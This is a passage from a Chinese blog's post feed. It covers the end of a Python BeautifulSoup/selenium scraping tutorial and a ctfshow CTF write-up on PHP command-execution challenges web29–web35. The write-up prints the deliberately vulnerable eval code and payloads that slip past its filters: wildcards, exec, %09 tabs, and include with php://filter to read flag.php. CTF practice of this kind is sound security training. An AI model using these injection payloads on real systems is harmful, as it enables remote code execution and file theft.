style="text-align:center">需要安装C语言库</td></tr><tr><td style="text-align:center">lxml XML解析器</td><td style="text-align:center">BeautifulSoup(markup ‘xml’)</td><td style="text-align:center">速度快，唯一支持XML的解析器</td><td style="text-align:center">需要安装C语言库</td></tr><tr><td style="text-align:center">html5lib</td><td style="text-align:center">BeautifulSoup(markup, ‘html5lib’)</td><td style="text-align:center">最好的容错性、以浏览器的方式解析文档、生成HTML5格式的文档</td><td style="text-align:center">速度慢，不依赖外部拓展</td></tr></tbody></table></div><p>在初始化的BeautifulSoup时，将第二个参数设为需要的解析器即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="string">&#x27;&lt;p&gt;Hello world&lt;/p&gt;&#x27;</span>, <span class="string">&#x27;lxml&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="节点选择器"><a href="#节点选择器" class="headerlink" title="节点选择器"></a>节点选择器</h3><p>beautifulsoup库比较有特定的节点选择器有<strong>遍历文档树</strong>、<strong>搜索文档树</strong>，当然也可以使用非常贴合前端开发逻辑的<strong>CSS选择器</strong>，或者使用lxml解析器的Xpath</p><h4 id="遍历文档树"><a href="#遍历文档树" class="headerlink" title="遍历文档树"></a>遍历文档树</h4><p>遍历文档树即使用父子、兄弟等节点间的关联关系来选择特定节点</p><p><strong>直接子节点</strong>：<code>.contents</code>属性或者<code>.children</code>属性</p><div class="note warning flat"><p>contents返回的是列表对象，而children返回的则是列表迭代器</p></div><p><strong>子孙节点</strong>：<code>.descendants</code>属性，返回生成器对象</p><p><code>.descendants</code>可以通过递归循环返回<strong>所有</strong>子孙节点</p><div class="note info flat"><details class="toggle" ><summary class="toggle-button" style="">生成器(generator)</summary><div class="toggle-content"><p>在 Python 中，使用了 <strong>yield</strong> 的函数被称为<strong>生成器（generator）</strong>。</p><p><strong>yield</strong> 是一个关键字，用于定义生成器函数，生成器函数是一种特殊的函数，可以在迭代过程中逐步产生值，而不是一次性返回所有结果。</p><p>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。</p><p>当在生成器函数中使用 <strong>yield</strong> 语句时，函数的执行将会暂停，并将 <strong>yield</strong> 后面的表达式作为当前迭代的值返回。</p><p>然后，每次调用生成器的 <strong>next()</strong> 方法或使用 <strong>for</strong> 循环进行迭代时，函数会从上次暂停的地方继续执行，直到再次遇到 <strong>yield</strong> 语句。这样，生成器函数可以逐步产生值，而不需要一次性计算并返回所有结果。</p><p>调用一个生成器函数，返回的是一个迭代器对象。</p><p>下面是一个简单的示例，展示了生成器函数的使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">countdown</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建生成器对象</span></span><br><span class="line">generator = countdown(<span class="number">5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 通过迭代生成器获取值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(generator))  <span class="comment"># 输出: 3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用 for 循环迭代生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> generator:</span><br><span class="line">    <span class="built_in">print</span>(value)  <span class="comment"># 输出: 2 1</span></span><br></pre></td></tr></table></figure></div></details></div><p><strong>直接父节点</strong>：<code>.parent</code>属性</p><p><strong>父辈节点</strong>：<code>.parents</code>属性</p><p><code>.parents</code> 属性可以递归得到元素的<strong>所有</strong>父辈节点</p><p><strong>兄弟节点</strong>：<code>.next_sibling</code>后一个兄弟节点，<code>.previous_sibling</code>前一个兄弟节点；<code>.next_siblings</code>后面所有兄弟节点，<code>.previous_siblings</code>前面所有兄弟节点</p><h4 id="搜索文档树"><a href="#搜索文档树" class="headerlink" title="搜索文档树"></a>搜索文档树</h4><p>搜索文档数通过name、正则表达式、属性和条件方法等筛选节点</p><p>搜索文档数的核心为<code>find_all()</code>和<code>find()</code>方法</p><p>筛选条件作为参数传给这两个方法，而返回值即为筛选到的节点</p><p>其中find_all返回所有满足筛选条件的节点，而find则是返回第一个匹配结果</p><p>当然，搜索文档树也融合了节点关联的思想</p><p>使用<code>find_parents()</code>、<code>find_parent()</code>可以直接选择筛选结果的父亲节点</p><p>使用<code>find_next_siblings()</code>、<code>find_next_sibling()</code>可以直接选择筛选结果后面的兄弟节点</p><p>使用<code>find_previous_siblings()</code>、<code>find_previous_sibling()</code>可以直接选择筛选结果前面的兄弟节点</p><p><strong>name筛选</strong></p><p>name筛选即通过给<code>find_all()</code>中的<strong>第一个参数name传参字符串或字符串列表</strong>，可以选中<strong>标签名与相应字符串完整匹配</strong>的标签</p><p>例如<code>find_all(&#39;h&#39;)</code>会选中<code>&lt;h&gt;</code>标签但不会选中<code>&lt;html&gt;</code></p><p><code>find_all([&quot;a&quot;,&quot;b&quot;])</code>会选中<code>&lt;a&gt;</code>和<code>&lt;b&gt;</code>标签</p><p><strong>正则表达式</strong></p><p>根据参数中传进的正则表达式来<strong>匹配标签名</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.<span class="built_in">compile</span>(<span class="string">&quot;^b&quot;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line"><span class="comment"># body</span></span><br><span class="line"><span class="comment"># b</span></span><br></pre></td></tr></table></figure><p>例如上面的<code>^b</code>会匹配所有b开头的标签，所以返回了<code>&lt;body&gt;</code>和<code>&lt;b&gt;</code></p><p><strong>属性筛选</strong></p><p>如果想要通过筛选属性值来搜索，可以通过方法中的<strong>参数attrs</strong>，也可以通过<strong>传非内置参数</strong></p><ol><li><p>如果传给<code>find_all()</code>的参数不是搜索内置的参数名,搜索时会把该参数当作标签的属性来搜索</p><p>例如给其传参id<code>soup.find_all(id=&#39;R1ck&#39;)</code>，则会搜索所有id为R1ck的标签</p><p>给参数名传的值可以是字符串、正则表达式、列表、True</p><div class="note primary flat"><p>给参数传True会匹配所有包含该属性的标签，无论属性值是什么。</p></div></li><li><p>给attrs传字典，也可以实现属性值筛选</p><p>字典中的键为属性，值为属性值</p></li></ol><p><strong>条件方法筛选</strong></p><p>条件方法筛选，即给find_all()的<strong>name参数或属性参数</strong>传入<strong>实现了特定条件的方法名</strong></p><div class="note warning flat"><p>该方法<strong>只能接收一个参数</strong>，如果该方法传给name，则接收参数为标签节点，如果传给属性，则接收参数为属性</p><p>而<strong>返回值必须为布尔变量</strong></p></div><p>方法中可以实现复杂的筛选</p><p>例如下面的例子，能够筛选出所有包含class属性却不包含id属性的标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">has_class_but_no_id</span>(<span class="params">tag</span>):</span><br><span class="line">    <span class="keyword">return</span> tag.has_attr(<span class="string">&#x27;class&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> tag.has_attr(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">soup.find_all(has_class_but_no_id)</span><br></pre></td></tr></table></figure><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>给<code>.select()</code>方法传入CSS选择器语法的字符串即可使用CSS选择器</p><p>具体的CSS选择器介绍可以参考以下文档</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors">CSS 选择器 - CSS：层叠样式表 | MDN (mozilla.org)</a></p><p><a href="https://www.w3school.com.cn/css/css_selector_type.asp">CSS 元素选择器 (w3school.com.cn)</a></p><h3 id="提取节点信息"><a href="#提取节点信息" class="headerlink" title="提取节点信息"></a>提取节点信息</h3><p><code>.string</code>可以获取节点包含的文本，即两标签之间的文本</p><p><code>.attrs</code>会返回包含所有属性及属性值的字典，如果属性有多值，则会在值的位置返回列表</p><p><code>.name</code>可以获取节点的名称</p><h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>在复杂登录场景下，或者是严格反爬机制下，可以使用selenium库，但是爬取速度较慢</p><h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><p><code>pip install selenium</code></p><h3 id="浏览器驱动"><a href="#浏览器驱动" class="headerlink" title="浏览器驱动"></a>浏览器驱动</h3><p>由于需要模拟浏览器进行相关操作，所以需要下载对应浏览器版本的驱动</p><p>这里以Chrome为例</p><p>在本地Chrome浏览器的<strong>设置&gt;关于</strong>中找到浏览器版本</p><img src="/posts/cd0d11b6cb14/image-20231018155713656.png" class="" title="image-20231018155713656"><p>在下面的驱动下载网站中找到对应版本的驱动</p><p><a href="https://googlechromelabs.github.io/chrome-for-testing/#stable">https://googlechromelabs.github.io/chrome-for-testing/#stable</a></p><img src="/posts/cd0d11b6cb14/image-20231018160035822.png" class="" title="image-20231018160035822"><p>一般保证版本号前三个数字相同就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 命令执行模块</title>
      <link href="/posts/31658dca3489/"/>
      <url>/posts/31658dca3489/</url>
      
        <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码对<code>flag</code>字符进行了过滤，我们可以使用通配符绕过</p><p>首先ls一下查看有哪些文件</p><img src="/posts/31658dca3489/image-20240510180030431.png" class="" title="image-20240510180030431"><p>已知flag在<code>flag.php</code>文件中，我们可以使用<code>cat f*</code></p><p>所有payload为<code>?c=echo system(&#39;cat f*&#39;);</code></p><p>在元素中找到flag</p><img src="/posts/31658dca3489/image-20240510180523117.png" class="" title="image-20240510180523117"><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题将<code>system</code>函数过滤了，使用<code>exec</code>函数来执行命令</p><p>payload为<code>?c=echo exec(&#39;cat f*&#39;);</code></p><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题多禁用了<code>cat</code>和<code>sort</code>这些查看文件内容的指令</p><p>我们可以使用<code>tail</code>来代替</p><p>单引号也被禁用，我们使用双引号代替</p><p>空格被禁用，使用TAB键<code>%09</code>代替</p><p>payload为<code>?c=echo exec(&quot;tail%09f*&quot;);</code></p><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本关将echo禁用，需要带有输出功能的php函数，可以尝试使用<code>include</code>文件包含加伪协议来绕过</p><p><code>?c=include%09$_GET[file]?&gt;&amp;file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>php遇到定界符关闭标签会自动在末尾加上一个分号。所以我们可以使用<code>?&gt;</code>来绕过对分号的过滤</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题过滤了双引号，但仍然可以使用上一题的payload</p><p><code>?c=include%09$_GET[file]?&gt;&amp;file=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题将冒号过滤，但并不影响我们使用文件包含，因为检测的是参数c</p><p><code>?c=include%09$_GET[file]?&gt;&amp;file=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入漏洞 远程命令/代码执行</title>
      <link href="/posts/ef9c5fde59cd/"/>
      <url>/posts/ef9c5fde59cd/</url>
      
